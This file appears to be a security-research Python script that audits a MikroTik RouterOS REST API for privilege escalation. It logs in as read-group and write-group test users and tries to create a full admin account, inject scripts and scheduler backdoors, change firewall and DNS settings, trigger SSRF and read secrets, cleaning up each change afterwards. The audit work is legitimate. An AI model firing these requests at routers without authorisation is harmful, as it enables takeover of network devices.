#!/usr/bin/env python3
"""
Finding 1 Expansion: REST API Permission Boundary Audit
========================================================
Systematically tests which REST API endpoints are accessible to read/write
group users. Goal: determine the full scope of the privilege escalation
beyond the confirmed reboot/shutdown/factory-reset.

HIGH-VALUE TARGETS:
  - POST /rest/user/add          → create admin account = full compromise
  - POST /rest/system/script/add → script injection = potential RCE
  - POST /rest/system/scheduler  → scheduled command execution
  - POST /rest/ip/firewall/*     → firewall manipulation
  - POST /rest/ip/dns/set        → DNS hijacking
  - POST /rest/tool/fetch        → SSRF (already confirmed)
  - POST /rest/file              → file write
  - PUT  /rest/system/identity   → config modification

Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS], NOT pristine — development testing)
"""

import requests
import json
import time
import socket
import struct
import sys
import datetime
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "[REDACTED-INTERNAL-IP]"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
BASE = f"http://{TARGET}"

# Test user definitions
TEST_USERS = {
    "testread":  {"group": "read",  "password": "ReadTest123"},
    "testwrite": {"group": "write", "password": "WriteTest123"},
}

# ============================================================
# REST API endpoints to test — organized by danger level
# ============================================================

# Category 1: CRITICAL — would mean full compromise
CRITICAL_WRITE_ENDPOINTS = [
    # User management
    {"method": "POST", "path": "/rest/user/add",
     "body": {"name": "pwned_admin", "group": "full", "password": "Pwned123"},
     "desc": "Create full-privilege admin user",
     "cleanup_path": "/rest/user/remove", "cleanup_id_field": ".id"},

    {"method": "POST", "path": "/rest/user/add",
     "body": {"name": "pwned_write", "group": "write", "password": "Pwned123"},
     "desc": "Create write-privilege user",
     "cleanup_path": "/rest/user/remove", "cleanup_id_field": ".id"},

    # Script injection
    {"method": "POST", "path": "/rest/system/script/add",
     "body": {"name": "test_exploit", "source": ":log info \"EXPLOIT_MARKER\""},
     "desc": "Create RouterOS script (potential RCE)",
     "cleanup_path": "/rest/system/script/remove", "cleanup_id_field": ".id"},

    # Scheduler — persistent backdoor
    {"method": "POST", "path": "/rest/system/scheduler/add",
     "body": {"name": "test_sched", "interval": "1d",
              "on-event": ":log info \"SCHED_MARKER\""},
     "desc": "Create scheduled task (persistent backdoor)",
     "cleanup_path": "/rest/system/scheduler/remove", "cleanup_id_field": ".id"},
]

# Category 2: HIGH — significant impact
HIGH_WRITE_ENDPOINTS = [
    # Firewall manipulation
    {"method": "POST", "path": "/rest/ip/firewall/filter/add",
     "body": {"chain": "input", "action": "accept", "comment": "TEST_MARKER",
              "disabled": "true"},
     "desc": "Add firewall filter rule",
     "cleanup_path": "/rest/ip/firewall/filter/remove", "cleanup_id_field": ".id"},

    {"method": "POST", "path": "/rest/ip/firewall/nat/add",
     "body": {"chain": "dstnat", "action": "accept", "comment": "TEST_MARKER",
              "disabled": "true"},
     "desc": "Add NAT rule",
     "cleanup_path": "/rest/ip/firewall/nat/remove", "cleanup_id_field": ".id"},

    {"method": "POST", "path": "/rest/ip/firewall/mangle/add",
     "body": {"chain": "prerouting", "action": "accept", "comment": "TEST_MARKER",
              "disabled": "true"},
     "desc": "Add mangle rule",
     "cleanup_path": "/rest/ip/firewall/mangle/remove", "cleanup_id_field": ".id"},

    # DNS hijacking
    {"method": "POST", "path": "/rest/ip/dns/static/add",
     "body": {"name": "evil.test.local", "address": "[REDACTED-IP]", "comment": "TEST_MARKER"},
     "desc": "Add static DNS entry (DNS hijacking)",
     "cleanup_path": "/rest/ip/dns/static/remove", "cleanup_id_field": ".id"},

    # Route manipulation
    {"method": "POST", "path": "/rest/ip/route/add",
     "body": {"dst-address": "[REDACTED-IP]/24", "gateway": "[REDACTED-INTERNAL-IP]",
              "comment": "TEST_MARKER", "disabled": "true"},
     "desc": "Add IP route",
     "cleanup_path": "/rest/ip/route/remove", "cleanup_id_field": ".id"},

    # IP address manipulation
    {"method": "POST", "path": "/rest/ip/address/add",
     "body": {"address": "[REDACTED-INTERNAL-IP]/24", "interface": "ether1",
              "comment": "TEST_MARKER", "disabled": "true"},
     "desc": "Add IP address to interface",
     "cleanup_path": "/rest/ip/address/remove", "cleanup_id_field": ".id"},

    # Certificate manipulation
    {"method": "POST", "path": "/rest/certificate/add",
     "body": {"name": "test_cert", "common-name": "evil.test",
              "key-size": "2048"},
     "desc": "Create certificate",
     "cleanup_path": "/rest/certificate/remove", "cleanup_id_field": ".id"},
]

# Category 3: MEDIUM — config changes
MEDIUM_WRITE_ENDPOINTS = [
    # SNMP modification
    {"method": "PATCH", "path": "/rest/snmp/set",
     "body": {"contact": "TEST_MARKER"},
     "desc": "Modify SNMP settings",
     "revert_body": {"contact": ""}},

    # System identity
    {"method": "PATCH", "path": "/rest/system/identity/set",
     "body": {"name": "HACKED"},
     "desc": "Change system identity",
     "revert_body": {"name": "MikroTik"}},

    # Logging
    {"method": "POST", "path": "/rest/system/logging/add",
     "body": {"topics": "info", "action": "memory", "prefix": "TEST_MARKER"},
     "desc": "Add logging rule",
     "cleanup_path": "/rest/system/logging/remove", "cleanup_id_field": ".id"},

    # IP service modification
    {"method": "PATCH", "path": "/rest/ip/service/set",
     "body": {".id": "telnet", "disabled": "false"},
     "desc": "Enable/disable IP service"},

    # Interface comment
    {"method": "PATCH", "path": "/rest/interface/set",
     "body": {".id": "ether1", "comment": "TEST_MARKER"},
     "desc": "Modify interface properties",
     "revert_body": {".id": "ether1", "comment": ""}},

    # PPP secret (credential exposure vector)
    {"method": "POST", "path": "/rest/ppp/secret/add",
     "body": {"name": "test_ppp", "password": "ppp_test_123", "service": "any",
              "comment": "TEST_MARKER"},
     "desc": "Add PPP secret",
     "cleanup_path": "/rest/ppp/secret/remove", "cleanup_id_field": ".id"},

    # DHCP server
    {"method": "POST", "path": "/rest/ip/dhcp-server/add",
     "body": {"name": "test_dhcp", "interface": "ether1", "disabled": "true",
              "comment": "TEST_MARKER"},
     "desc": "Add DHCP server",
     "cleanup_path": "/rest/ip/dhcp-server/remove", "cleanup_id_field": ".id"},

    # Bridge
    {"method": "POST", "path": "/rest/interface/bridge/add",
     "body": {"name": "test_bridge", "comment": "TEST_MARKER", "disabled": "true"},
     "desc": "Create bridge interface",
     "cleanup_path": "/rest/interface/bridge/remove", "cleanup_id_field": ".id"},

    # VLAN
    {"method": "POST", "path": "/rest/interface/vlan/add",
     "body": {"name": "test_vlan", "vlan-id": "999", "interface": "ether1",
              "comment": "TEST_MARKER", "disabled": "true"},
     "desc": "Create VLAN interface",
     "cleanup_path": "/rest/interface/vlan/remove", "cleanup_id_field": ".id"},
]

# Category 4: Dangerous system operations (non-destructive tests)
SYSTEM_OPS = [
    # Run script — test if read user can execute scripts
    {"method": "POST", "path": "/rest/system/script/run",
     "body": {".id": "*1"},  # won't work without a script, but tests auth
     "desc": "Run a script (command execution)"},

    # Export — exfiltrate configuration
    {"method": "POST", "path": "/rest/export",
     "body": {},
     "desc": "Export full configuration"},

    # Backup
    {"method": "POST", "path": "/rest/system/backup/save",
     "body": {"name": "test_backup"},
     "desc": "Create system backup",
     "cleanup_note": "Remove /test_backup.backup via file/remove"},

    # Package update check
    {"method": "POST", "path": "/rest/system/package/update/check-for-updates",
     "body": {},
     "desc": "Check for firmware updates"},

    # Tool fetch — SSRF (already confirmed, verify with read user)
    {"method": "POST", "path": "/rest/tool/fetch",
     "body": {"url": "http://127.0.0.1/", "mode": "http", "dst-path": "/dev/null"},
     "desc": "SSRF via tool/fetch (read user)"},

    # Ping — could be used for network recon
    {"method": "POST", "path": "/rest/ping",
     "body": {"address": "127.0.0.1", "count": "1"},
     "desc": "Execute ping from router"},

    # Torch — traffic monitoring
    {"method": "POST", "path": "/rest/tool/torch",
     "body": {"interface": "ether1", "duration": "1"},
     "desc": "Run traffic torch (monitoring)"},

    # Traceroute
    {"method": "POST", "path": "/rest/tool/traceroute",
     "body": {"address": "127.0.0.1", "count": "1"},
     "desc": "Execute traceroute from router"},

    # Bandwidth test
    {"method": "POST", "path": "/rest/tool/bandwidth-test",
     "body": {"address": "127.0.0.1", "duration": "1"},
     "desc": "Run bandwidth test"},

    # Supout (support output) — info disclosure
    {"method": "POST", "path": "/rest/system/sup-output",
     "body": {},
     "desc": "Generate support output file"},

    # Email — could be used for spam relay
    {"method": "POST", "path": "/rest/tool/e-mail/send",
     "body": {"to": "test@test.com", "subject": "test", "body": "test"},
     "desc": "Send email from router"},
]

# Category 5: READ endpoints for sensitive data
SENSITIVE_READ_ENDPOINTS = [
    {"path": "/rest/user", "desc": "User list (usernames, groups)"},
    {"path": "/rest/ppp/secret", "desc": "PPP secrets (credentials)"},
    {"path": "/rest/system/resource", "desc": "System resources"},
    {"path": "/rest/system/identity", "desc": "System identity"},
    {"path": "/rest/ip/address", "desc": "IP addresses"},
    {"path": "/rest/ip/route", "desc": "Routing table"},
    {"path": "/rest/ip/firewall/filter", "desc": "Firewall filter rules"},
    {"path": "/rest/ip/firewall/nat", "desc": "NAT rules"},
    {"path": "/rest/ip/dns", "desc": "DNS configuration"},
    {"path": "/rest/ip/service", "desc": "IP services config"},
    {"path": "/rest/system/logging", "desc": "Logging configuration"},
    {"path": "/rest/system/clock", "desc": "System clock"},
    {"path": "/rest/system/ntp/client", "desc": "NTP client config"},
    {"path": "/rest/system/package", "desc": "Installed packages"},
    {"path": "/rest/system/history", "desc": "Command history"},
    {"path": "/rest/system/license", "desc": "License info"},
    {"path": "/rest/certificate", "desc": "Certificates"},
    {"path": "/rest/interface", "desc": "Interface list"},
    {"path": "/rest/ip/neighbor", "desc": "Neighbor discovery"},
    {"path": "/rest/system/script", "desc": "Scripts (source code)"},
    {"path": "/rest/system/scheduler", "desc": "Scheduled tasks"},
    {"path": "/rest/file", "desc": "File listing"},
    {"path": "/rest/log", "desc": "System log"},
    {"path": "/rest/ip/ssh", "desc": "SSH configuration"},
    {"path": "/rest/user/group", "desc": "User groups & permissions"},
    {"path": "/rest/snmp", "desc": "SNMP configuration"},
    {"path": "/rest/snmp/community", "desc": "SNMP community strings"},
    {"path": "/rest/radius", "desc": "RADIUS configuration"},
    {"path": "/rest/ip/hotspot", "desc": "Hotspot configuration"},
    {"path": "/rest/ip/proxy", "desc": "Web proxy config"},
    {"path": "/rest/env", "desc": "Environment variables (undocumented)"},
    {"path": "/rest/system/console", "desc": "Console sessions (undocumented)"},
]


def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def api_request(method, path, body=None, user=ADMIN_USER, password=ADMIN_PASS, timeout=10):
    """Make REST API request, return (status_code, response_json_or_text, error)"""
    url = f"{BASE}{path}"
    auth = (user, password)
    headers = {"Content-Type": "application/json"} if body else {}
    try:
        if method == "GET":
            r = requests.get(url, auth=auth, timeout=timeout)
        elif method == "POST":
            r = requests.post(url, auth=auth, json=body, headers=headers, timeout=timeout)
        elif method == "PUT":
            r = requests.put(url, auth=auth, json=body, headers=headers, timeout=timeout)
        elif method == "PATCH":
            r = requests.patch(url, auth=auth, json=body, headers=headers, timeout=timeout)
        elif method == "DELETE":
            r = requests.delete(url, auth=auth, json=body, headers=headers, timeout=timeout)
        else:
            return None, None, f"Unknown method {method}"

        try:
            resp_json = r.json()
        except:
            resp_json = r.text[:500]

        return r.status_code, resp_json, None
    except requests.exceptions.Timeout:
        return None, None, "Timeout"
    except requests.exceptions.ConnectionError as e:
        return None, None, f"ConnectionError: {e}"
    except Exception as e:
        return None, None, str(e)


def setup_test_users():
    """Create test users for the audit"""
    log("Creating test users...")
    for username, info in TEST_USERS.items():
        status, resp, err = api_request("POST", "/rest/user/add", {
            "name": username, "group": info["group"], "password": info["password"]
        })
        if err:
            log(f"  ERROR creating {username}: {err}")
        elif status in (200, 201):
            log(f"  Created {username} (group={info['group']})")
        else:
            log(f"  {username}: HTTP {status} — {resp}")


def cleanup_test_users():
    """Remove test users"""
    log("Cleaning up test users...")
    for username in TEST_USERS:
        # Find user ID
        status, resp, err = api_request("GET", f"/rest/user?name={username}")
        if status == 200 and isinstance(resp, list) and len(resp) > 0:
            uid = resp[0].get(".id")
            if uid:
                api_request("POST", "/rest/user/remove", {".id": uid})
                log(f"  Removed {username}")


def cleanup_item(endpoint_info, created_id):
    """Clean up a created resource"""
    if not created_id:
        return
    cleanup_path = endpoint_info.get("cleanup_path")
    if cleanup_path:
        api_request("POST", cleanup_path, {".id": created_id})
    revert_body = endpoint_info.get("revert_body")
    if revert_body:
        method = endpoint_info.get("method", "PATCH")
        api_request(method, endpoint_info["path"], revert_body)


def test_write_endpoint(endpoint, username, password):
    """Test a write endpoint and return result dict"""
    method = endpoint["method"]
    path = endpoint["path"]
    body = endpoint.get("body", {})
    desc = endpoint["desc"]

    status, resp, err = api_request(method, path, body, user=username, password=password)

    result = {
        "endpoint": f"{method} {path}",
        "description": desc,
        "user": username,
        "http_status": status,
        "error": err,
        "response_preview": str(resp)[:300] if resp else None,
    }

    # Determine if the operation succeeded
    if err:
        result["accessible"] = False
        result["outcome"] = f"Error: {err}"
    elif status in (200, 201):
        result["accessible"] = True
        result["outcome"] = "SUCCESS — operation executed"

        # Extract created resource ID for cleanup
        if isinstance(resp, dict) and ".id" in resp:
            result["created_id"] = resp[".id"]
        elif isinstance(resp, list) and len(resp) > 0:
            if isinstance(resp[0], dict) and ".id" in resp[0]:
                result["created_id"] = resp[0][".id"]
    elif status == 400:
        # 400 can mean "bad request" but the endpoint was REACHABLE
        resp_str = str(resp)
        if "no such command" in resp_str.lower() or "unknown" in resp_str.lower():
            result["accessible"] = False
            result["outcome"] = "Endpoint not available"
        elif "permission" in resp_str.lower() or "denied" in resp_str.lower():
            result["accessible"] = False
            result["outcome"] = "Permission denied"
        else:
            # Got past auth but request format wrong — still indicates access
            result["accessible"] = "PARTIAL"
            result["outcome"] = f"HTTP 400 — past auth but request error: {resp_str[:200]}"
    elif status == 401:
        result["accessible"] = False
        result["outcome"] = "Authentication rejected"
    elif status == 403:
        result["accessible"] = False
        result["outcome"] = "Forbidden — permission denied"
    elif status == 404:
        result["accessible"] = False
        result["outcome"] = "Endpoint not found"
    else:
        result["accessible"] = "UNKNOWN"
        result["outcome"] = f"HTTP {status}"

    return result


def test_read_endpoint(endpoint, username, password):
    """Test a GET endpoint for sensitive data access"""
    path = endpoint["path"]
    desc = endpoint["desc"]

    status, resp, err = api_request("GET", path, user=username, password=password)

    result = {
        "endpoint": f"GET {path}",
        "description": desc,
        "user": username,
        "http_status": status,
        "error": err,
    }

    if err:
        result["accessible"] = False
        result["data_returned"] = False
    elif status == 200:
        result["accessible"] = True
        result["data_returned"] = True
        if isinstance(resp, list):
            result["record_count"] = len(resp)
            result["response_preview"] = str(resp[:2])[:500]
        elif isinstance(resp, dict):
            result["record_count"] = 1
            result["response_preview"] = str(resp)[:500]
        else:
            result["response_preview"] = str(resp)[:500]
    elif status in (401, 403):
        result["accessible"] = False
        result["data_returned"] = False
    else:
        result["accessible"] = "UNKNOWN"
        result["data_returned"] = False

    return result


def run_audit():
    """Main audit function"""
    log("=" * 70)
    log("FINDING 1 EXPANSION: REST API Permission Boundary Audit")
    log(f"Target: {TARGET}")
    log("=" * 70)

    # Verify connectivity
    status, resp, err = api_request("GET", "/rest/system/resource")
    if err or status != 200:
        log(f"FATAL: Cannot reach target — {err}")
        return
    version = resp.get("version", "unknown") if isinstance(resp, dict) else "unknown"
    uptime = resp.get("uptime", "unknown") if isinstance(resp, dict) else "unknown"
    log(f"Target: RouterOS {version}, uptime {uptime}")

    # Setup
    setup_test_users()
    time.sleep(1)

    results = {
        "metadata": {
            "script": "finding1_expansion.py",
            "target": TARGET,
            "version": version,
            "timestamp": datetime.datetime.now().isoformat(),
            "purpose": "Enumerate full scope of REST API privilege escalation (Finding 1)",
        },
        "critical_write_tests": [],
        "high_write_tests": [],
        "medium_write_tests": [],
        "system_ops_tests": [],
        "sensitive_read_tests": [],
        "summary": {},
    }

    # ================================================================
    # TEST CRITICAL WRITE ENDPOINTS
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 1: CRITICAL Write Endpoints (full compromise if accessible)")
    log("=" * 70)

    for ep in CRITICAL_WRITE_ENDPOINTS:
        for username, info in TEST_USERS.items():
            result = test_write_endpoint(ep, username, info["password"])
            results["critical_write_tests"].append(result)

            icon = "🔴" if result["accessible"] == True else ("🟡" if result["accessible"] == "PARTIAL" else "✅")
            log(f"  {icon} {username} ({info['group']}) → {ep['method']} {ep['path']}")
            log(f"      {result['outcome']}")

            # Cleanup if we created something
            if result.get("created_id"):
                cleanup_item(ep, result["created_id"])
                log(f"      [Cleaned up: {result['created_id']}]")

            time.sleep(0.5)

    # ================================================================
    # TEST HIGH WRITE ENDPOINTS
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 2: HIGH Write Endpoints (firewall, DNS, routing)")
    log("=" * 70)

    for ep in HIGH_WRITE_ENDPOINTS:
        for username, info in TEST_USERS.items():
            result = test_write_endpoint(ep, username, info["password"])
            results["high_write_tests"].append(result)

            icon = "🔴" if result["accessible"] == True else ("🟡" if result["accessible"] == "PARTIAL" else "✅")
            log(f"  {icon} {username} ({info['group']}) → {ep['method']} {ep['path']}")
            log(f"      {result['outcome']}")

            if result.get("created_id"):
                cleanup_item(ep, result["created_id"])
                log(f"      [Cleaned up: {result['created_id']}]")

            time.sleep(0.5)

    # ================================================================
    # TEST MEDIUM WRITE ENDPOINTS
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 3: MEDIUM Write Endpoints (config changes)")
    log("=" * 70)

    for ep in MEDIUM_WRITE_ENDPOINTS:
        for username, info in TEST_USERS.items():
            result = test_write_endpoint(ep, username, info["password"])
            results["medium_write_tests"].append(result)

            icon = "🔴" if result["accessible"] == True else ("🟡" if result["accessible"] == "PARTIAL" else "✅")
            log(f"  {icon} {username} ({info['group']}) → {ep['method']} {ep['path']}")
            log(f"      {result['outcome']}")

            if result.get("created_id"):
                cleanup_item(ep, result["created_id"])
                log(f"      [Cleaned up: {result['created_id']}]")

            time.sleep(0.5)

    # ================================================================
    # TEST SYSTEM OPERATIONS
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 4: System Operations (script execution, backups, tools)")
    log("=" * 70)

    for ep in SYSTEM_OPS:
        for username, info in TEST_USERS.items():
            result = test_write_endpoint(ep, username, info["password"])
            results["system_ops_tests"].append(result)

            icon = "🔴" if result["accessible"] == True else ("🟡" if result["accessible"] == "PARTIAL" else "✅")
            log(f"  {icon} {username} ({info['group']}) → {ep['method']} {ep['path']}")
            log(f"      {result['outcome']}")

            if result.get("created_id"):
                cleanup_item(ep, result.get("created_id"))

            time.sleep(0.5)

    # ================================================================
    # TEST SENSITIVE READ ENDPOINTS
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 5: Sensitive Read Endpoints (data exfiltration)")
    log("=" * 70)

    for ep in SENSITIVE_READ_ENDPOINTS:
        for username, info in TEST_USERS.items():
            result = test_read_endpoint(ep, username, info["password"])
            results["sensitive_read_tests"].append(result)

            if result["accessible"]:
                count = result.get("record_count", "?")
                log(f"  🔴 {username} ({info['group']}) → GET {ep['path']} — {count} records")
            else:
                log(f"  ✅ {username} ({info['group']}) → GET {ep['path']} — blocked")

            time.sleep(0.3)

    # ================================================================
    # SPECIAL: Test if read user can run a script by name
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 6: Script Execution Chain Test")
    log("=" * 70)

    # Create a test script as admin
    log("  Creating test script as admin...")
    status, resp, err = api_request("POST", "/rest/system/script/add", {
        "name": "audit_test_script",
        "source": ':log info "AUDIT_SCRIPT_EXECUTED"'
    })
    script_id = None
    if status in (200, 201) and isinstance(resp, dict):
        script_id = resp.get(".id")
        log(f"  Script created: {script_id}")

        # Try to run it as read user
        for username, info in TEST_USERS.items():
            log(f"  Testing: {username} ({info['group']}) → POST /rest/system/script/run")
            run_result = test_write_endpoint(
                {"method": "POST", "path": "/rest/system/script/run",
                 "body": {".id": script_id}, "desc": "Run existing script"},
                username, info["password"]
            )
            results["system_ops_tests"].append(run_result)
            icon = "🔴" if run_result["accessible"] == True else "✅"
            log(f"    {icon} {run_result['outcome']}")
            time.sleep(0.5)

        # Cleanup
        api_request("POST", "/rest/system/script/remove", {".id": script_id})
        log("  Cleaned up test script")
    else:
        log(f"  Could not create test script: {status} {resp}")

    # ================================================================
    # SPECIAL: Test if read user can access file contents
    # ================================================================
    log("\n" + "=" * 70)
    log("PHASE 7: File Access Tests")
    log("=" * 70)

    for username, info in TEST_USERS.items():
        # List files
        result = test_read_endpoint(
            {"path": "/rest/file", "desc": "File listing"},
            username, info["password"]
        )
        log(f"  {'🔴' if result['accessible'] else '✅'} {username} → GET /rest/file — "
            f"{'accessible' if result['accessible'] else 'blocked'}")

        # Try to read specific files (config backup, etc.)
        for fpath in ["/rest/file/flash", "/rest/file/flash/rw"]:
            r = test_read_endpoint(
                {"path": fpath, "desc": f"File access: {fpath}"},
                username, info["password"]
            )
            results["sensitive_read_tests"].append(r)
            log(f"  {'🔴' if r['accessible'] else '✅'} {username} → GET {fpath}")

    # ================================================================
    # SUMMARY
    # ================================================================
    log("\n" + "=" * 70)
    log("AUDIT SUMMARY")
    log("=" * 70)

    categories = {
        "CRITICAL Write": results["critical_write_tests"],
        "HIGH Write": results["high_write_tests"],
        "MEDIUM Write": results["medium_write_tests"],
        "System Ops": results["system_ops_tests"],
        "Sensitive Read": results["sensitive_read_tests"],
    }

    total_accessible = 0
    total_blocked = 0
    total_partial = 0
    total_tests = 0

    accessible_by_read = []
    accessible_by_write = []

    for cat_name, cat_results in categories.items():
        accessible = sum(1 for r in cat_results if r.get("accessible") == True)
        partial = sum(1 for r in cat_results if r.get("accessible") == "PARTIAL")
        blocked = sum(1 for r in cat_results if r.get("accessible") == False)
        total = len(cat_results)

        total_accessible += accessible
        total_partial += partial
        total_blocked += blocked
        total_tests += total

        log(f"\n  {cat_name}: {accessible} accessible, {partial} partial, "
            f"{blocked} blocked (of {total})")

        for r in cat_results:
            if r.get("accessible") in (True, "PARTIAL"):
                entry = {
                    "endpoint": r["endpoint"],
                    "description": r["description"],
                    "status": r["http_status"],
                    "outcome": r.get("outcome", "accessible"),
                }
                if "testread" in r.get("user", ""):
                    accessible_by_read.append(entry)
                elif "testwrite" in r.get("user", ""):
                    accessible_by_write.append(entry)

    results["summary"] = {
        "total_tests": total_tests,
        "total_accessible": total_accessible,
        "total_partial": total_partial,
        "total_blocked": total_blocked,
        "accessible_by_read_user": accessible_by_read,
        "accessible_by_write_user": accessible_by_write,
        "read_user_accessible_count": len(accessible_by_read),
        "write_user_accessible_count": len(accessible_by_write),
    }

    log(f"\n  TOTAL: {total_accessible} accessible + {total_partial} partial / "
        f"{total_tests} tests")
    log(f"  Read user ({TEST_USERS['testread']['group']}): "
        f"{len(accessible_by_read)} endpoints accessible")
    log(f"  Write user ({TEST_USERS['testwrite']['group']}): "
        f"{len(accessible_by_write)} endpoints accessible")

    if accessible_by_read:
        log(f"\n  *** READ USER ACCESSIBLE ENDPOINTS ***")
        for e in accessible_by_read:
            log(f"    🔴 {e['endpoint']} — {e['description']}")

    if accessible_by_write:
        log(f"\n  *** WRITE USER ACCESSIBLE ENDPOINTS ***")
        for e in accessible_by_write:
            log(f"    🔴 {e['endpoint']} — {e['description']}")

    # Cleanup
    cleanup_test_users()

    # Also remove any pwned users that might have been created
    for pname in ["pwned_admin", "pwned_write"]:
        status, resp, err = api_request("GET", f"/rest/user?name={pname}")
        if status == 200 and isinstance(resp, list) and len(resp) > 0:
            uid = resp[0].get(".id")
            if uid:
                api_request("POST", "/rest/user/remove", {".id": uid})
                log(f"  Cleaned up leftover: {pname}")

    # Save results
    out_path = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence/finding1_expansion.json"
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2, default=str)
    log(f"\nResults saved to {out_path}")

    return results


if __name__ == "__main__":
    run_audit()
